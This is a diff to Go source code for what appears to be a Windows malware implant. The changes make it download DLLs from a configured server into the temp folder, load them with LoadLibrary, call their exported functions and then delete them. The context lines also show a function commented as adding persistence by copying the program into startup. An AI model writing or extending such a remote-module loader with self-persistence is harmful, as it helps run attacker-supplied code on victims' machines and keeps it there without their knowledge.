@@ -6,13 +6,13 @@ import "C"
 import (
 	"fmt"
 	"io"
-	"net"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strings"
 	"syscall"
-	"unsafe"
 	"time"
+	"unsafe"
 )
 
 var (
@@ -30,24 +30,36 @@ func cleanup(handle syscall.Handle) {
 	}
 }
 
+// Get full path to a DLL in temp folder
+func tempDLLPath(dll string) string {
+	return filepath.Join(os.TempDir(), dll)
+}
+
 func downloadDLL(dll string) error {
+	dllPath := tempDLLPath(dll)
+
+	// Remove existing DLL before re-downloading
+	os.Remove(dllPath)
+
 	resp, err := http.Get(httpServer + "/downloads/" + dll)
 	if err != nil {
-		return err
+		return fmt.Errorf("download failed: %w", err)
 	}
 	defer resp.Body.Close()
 
-	f, err := os.Create(dll)
+	f, err := os.Create(dllPath)
 	if err != nil {
-		return err
+		return fmt.Errorf("create failed: %w", err)
 	}
 	defer f.Close()
+
 	_, err = io.Copy(f, resp.Body)
 	return err
 }
 
-// Safely call exported DLL function
-func callDLL(dllPath, funcName, arg1, arg2 string) (string, error) {
+func callDLL(dllName, funcName, arg1, arg2 string) (string, error) {
+	dllPath := tempDLLPath(dllName)
+
 	dll, err := syscall.LoadLibrary(dllPath)
 	if err != nil {
 		return "", fmt.Errorf("load failed: %v", err)
@@ -59,7 +71,7 @@ func callDLL(dllPath, funcName, arg1, arg2 string) (string, error) {
 		return "", fmt.Errorf("proc not found: %v", err)
 	}
 
-	output := make([]byte, 1 << 24)
+	output := make([]byte, 1<<24)
 	cArg1 := append([]byte(arg1), 0)
 	cArg2 := append([]byte(arg2), 0)
 
@@ -79,6 +91,17 @@ func callDLL(dllPath, funcName, arg1, arg2 string) (string, error) {
 
 	return string(output[:end]), nil
 }
+
+// Remove a specific DLL from the temp folder
+func removeDLL(name string) error {
+	dllPath := tempDLLPath(name)
+	err := os.Remove(dllPath)
+	if err != nil && !os.IsNotExist(err) {
+		return fmt.Errorf("failed to remove %s: %w", dllPath, err)
+	}
+	return nil
+}
+
 
 // Add persistence by copying itself to startup
 func persistent() string {
